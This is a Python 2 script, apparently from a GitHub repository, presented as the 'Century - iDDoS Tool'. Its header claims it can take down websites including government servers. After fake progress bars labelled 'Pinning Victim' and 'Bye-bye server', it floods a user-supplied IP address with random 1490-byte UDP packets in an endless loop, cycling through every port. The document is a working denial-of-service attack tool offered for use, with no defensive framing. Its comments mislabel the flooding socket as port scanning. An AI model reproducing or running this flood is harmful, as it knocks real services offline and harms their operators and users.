# |-----------------------------------------------------------------------------------------------|
# | Century - iDDoS Tool                                                                          |
# |                                                                                               |
# | DDoSing is the most massive type of web and server attack                                     |
# | This tool can takedown strong webstites including goverment servers as well                   |
# |                                                                                               |
# | author : Ghoul3r , version 1.6                                                                |
# |-----------------------------------------------------------------------------------------------|
# | Copyright (c) 2022 Ghoul3r                                                                    |
# |-----------------------------------------------------------------------------------------------|
# | Permission is hereby granted, free of charge, to any person obtaining a copy                  |
# | of this software and associated documentation files (the "Software"), to deal                 |
# | in the Software without restriction, including without limitation the rights                  |
# | to use, copy, modify, merge, publish, distribute, sublicense, and/or sell                     |
# | copies of the Software, and to permit persons to whom the Software is                         |
# | furnished to do so, subject to the following conditions:                                      |
# |                                                                                               |
# | The above copyright notice and this permission notice shall be included in all                |
# | copies or substantial portions of the Software.                                               |
# |-----------------------------------------------------------------------------------------------|
# | THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR                    |
# | IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,                      |
# | FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE                   |
# | AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER                        |
# | LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,                 |
# | OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE                 |
# | SOFTWARE.                                                                                     |
# |-----------------------------------------------------------------------------------------------|

# Importing modules
import sys
import os
import time
import socket
import random
# Coding time logic
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Defining sockets for computer to scan ports
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Startign terminal UI
os.system("clear")
print ''' 
  ____           _
 / ___|___ _ __ | |_ _   _ _ __ _   _
| |   / _ \ '_ \| __| | | | '__| | | |
| |__|  __/ | | | |_| |_| | |  | |_| |
 \____\___|_| |_|\__|\__,_|_|   \__, |
                                |___/ 
'''
print'''
Author   : Ghoul3r
Github   : https://github.com/Ghoul3r
Source   : https://github.com/Ghoul3r/Century-DDoS.git
'''

# Defining ip variables
ip = raw_input("IP Target: ")
port = input("Port: ")

# Preparing progressbar
os.system("clear")
def progressbar(it, prefix="", size=60, file=sys.stdout):
    count = len(it)

    def show(j):
        x = int(size * j / count)
        file.write(
            "%s[%s%s] %i/%i\r" % (prefix, "#" * x, "." * (size - x), j, count))
        file.flush()

    show(0)
    for i, item in enumerate(it):
        yield item
        show(i + 1)
    file.write("\n")
    file.flush()

for i in progressbar(range(100), "Fetching Packets: ", 30):
    time.sleep(0.02)
os.system('clear')
for i in progressbar(range(100), "Pinning Victim: ", 30):
    time.sleep(0.09)
os.system('clear')
for i in progressbar(range(100), "Initializing: ", 20):
    time.sleep(0.04)
os.system('clear')
for i in progressbar(range(100), "Bye-bye server: ", 20):
    time.sleep(0.01)
os.system('clear')
time.sleep(0.1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packets to %s through port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
